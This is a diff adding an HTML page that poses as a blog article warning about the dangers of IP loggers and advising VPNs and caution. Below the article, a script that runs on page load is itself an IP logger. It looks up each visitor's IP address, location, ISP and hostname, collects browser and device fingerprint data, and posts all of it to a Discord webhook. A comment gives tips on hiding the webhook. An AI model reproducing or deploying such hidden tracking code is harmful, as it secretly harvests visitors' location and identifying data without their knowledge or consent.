@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>The Dangers of IP Loggers</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+      header {
+        background-color: #333;
+        color: #fff;
+        padding: 10px;
+        text-align: center;
+      }
+      h1 {
+        margin: 0;
+        font-size: 32px;
+      }
+      p {
+        font-size: 18px;
+        line-height: 1.5;
+        margin: 20px 5px;
+      }
+      .danger {
+        color: red;
+        font-weight: bold;
+      }
+      footer {
+        background-color: #333;
+        color: #fff;
+        padding: 10px;
+        text-align: center;
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <h1>The Dangers of IP Loggers</h1>
+    </header>
+    <main>
+      <p>
+        IP loggers are malicious tools that can pose a serious threat to your online security and privacy. These tools are designed to track your IP address, which is a unique identifier that can reveal your location, internet service provider, and other sensitive information. In the wrong hands, this information can be used for cyber attacks, identity theft, and other malicious activities.
+      </p>
+      <p>
+        One of the most significant dangers of IP loggers is that they can be used to launch phishing attacks. Phishing is a type of cyber attack that involves tricking the victim into revealing sensitive information, such as passwords or credit card numbers. With access to your IP address, attackers can craft convincing phishing emails or websites that appear to be legitimate, making it much easier to trick you into revealing sensitive information.
+      </p>
+      <p>
+        Another danger of IP loggers is that they can be used to gain unauthorized access to your computer or network. With your IP address, attackers can attempt to exploit vulnerabilities in your network or use social engineering tactics to trick you into giving them access. Once an attacker has access to your network or computer, they can steal sensitive information, install malware, or take control of your device.
+      </p>
+      <p>
+        Fortunately, there are several steps you can take to protect yourself from IP loggers and other cyber threats. First, it's essential to be vigilant when browsing the internet. Avoid clicking on suspicious links or downloading files from unknown sources, as these may contain IP loggers or other malicious software. Always use anti-virus software and keep your operating system and web browser up to date to protect yourself from known vulnerabilities.
+      </p>
+      <p>
+        Another effective way to protect yourself from IP loggers is to use a Virtual Private Network (VPN). A VPN is a secure and encrypted connection that allows you to browse the internet anonymously. When you use a VPN, your IP address is hidden, making it much more difficult for attackers to track your location or identify you.
+      </p>
+      <p>
+        Finally, it's essential to be mindful of the information you share online. Avoid posting personal information, such as your home address or phone number, on social media or other public forums. Be cautious when providing personal information to websites or services, and never give out sensitive information, such as credit card numbers or social security numbers, unless you are certain that the website is legitimate and secure.
+      </p>
+      <p>
+        In conclusion, IP loggers pose a serious threat to your online security and privacy. By being vigilant when browsing the internet, using anti-virus software and keeping your system up to date, using a VPN, and being mindful of the information you share online, you can protect yourself from these malicious tools and stay safe online.
+      </p>
+      <p>
+        <span class="danger">Never click on suspicious links or download files from unknown sources, as these may contain IP loggers.</span>
+      </p>
+    </main>
+    <footer>
+      &copy; Very real blog website, no rights for you.
+    </footer>
+    <script>
+      let echolog = {};
+      fetch("https://wtfismyip.com/json")
+        .then((response) => response.json())
+        .then((data) => {
+          let echolog = {
+            ipAddress: data.YourFuckingIPAddress,
+            location: data.YourFuckingLocation,
+            hostname: data.YourFuckingHostname,
+            isp: data.YourFuckingISP,
+            city: data.YourFuckingCity,
+            country: data.YourFuckingCountry,
+            countryCode: data.YourFuckingCountryCode,
+            userAgent: navigator.userAgent,
+            windowProp: Object.keys(window).length,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            windowRatio: window.innerWidth / window.innerHeight,
+            screenWidth: window.screen.availWidth,
+            screenHeight: window.screen.availHeight,
+            screenRatio: window.screen.availWidth / window.screen.availHeight,
+            DPI: window.devicePixelRatio,
+            colorDepth: window.screen.colorDepth,
+            orientation: window.screen.orientation.type,
+            orientationAngle: window.screen.orientation.angle,
+            os: navigator.platform,
+            threads: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory,
+            systemLanguages: navigator.languages.join(", "),
+            languages: navigator.language,
+          };
+
+          // Set up the payload for the webhook
+          const payload = {
+            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
+          };
+          // This is a lazy way of doing it, having
+          // your webhook url out in the open like
+          // this is a bad idea, you should instead
+          // have it contact a internal API to
+          // forward the request.
+          fetch("https://discord.com/api/webhooks/id/token", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+          })
+            .then((response) => console.log(response))
+            .catch((error) => console.error(error));
+        })
+        .catch((error) => console.error(error));
+    </script>
+  </body>
+</html>
